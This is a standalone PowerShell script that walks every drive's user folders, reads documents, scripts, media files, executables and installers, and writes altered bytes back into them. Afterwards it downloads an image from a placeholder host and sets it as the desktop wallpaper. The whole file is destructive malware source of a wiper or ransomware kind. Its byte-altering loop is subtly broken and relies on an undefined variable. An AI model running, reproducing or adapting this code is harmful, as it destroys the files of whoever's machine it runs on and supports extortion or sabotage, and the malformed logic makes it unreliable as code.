$disks = Get-WmiObject Win32_LogicalDisk | Select-Object -Expand DeviceID
Foreach($disk in $disks){
	if($disk -match "C:"){
		$disk = "C:\Users"
	}
	$files = gci "$disk\" -recurse | Where-Object { !$_.PSIsContainer } | Select-Object FullName
	Foreach($file in $files){
		if($file -notmatch ".*\\windows\\.*"){
			if($file -match ".*\.docx" -or $file -match ".*\.txt" -or $file -match ".*\.ps1" -or $file -match ".*\.bat" -or $file -match ".*\.vbs"){
				$content = [System.IO.File]::ReadAllBytes($file.FullName)
				for($i = 0; $i -le $content.length - 1; $i++) {if ($content[$i] -eq 255){$content[$i] = 0} else {$other[$i] += 1}}
				[System.IO.File]::WriteAllBytes($file.FullName, $content)
				}
			if($file -match ".*\.pdf" -or $file -match ".*\.avi" -or $file -match ".*\.jpg" -or $file -match ".*\.png" -or $file -match ".*\.psd" -or $file -match ".*\.mp4" -or $file -match ".*\.mov" -or $file -match ".*\.mp3" -or $file -match ".*\.exe" -or $file -match ".*\.msi"){
				$content = [System.IO.File]::ReadAllBytes($file.FullName)
				for($i = 0; $i -le 10 -And $i -le $content.length - 1; $i++) {if ($content[$i] -eq 255){$content[$i] = 0} else {$other[$i] += 1}}
				[System.IO.File]::WriteAllBytes($file.FullName, $content)
			}
		}
	}
}

$url = 'https://example.test/image.png'
$wallpaper = "$env:USERPROFILE\wallpaper.png"
(New-Object Net.WebClient).DownloadFile($url, $wallpaper)
Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value $wallpaper
rundll32.exe user32.dll, UpdatePerUserSystemParameters 1, True
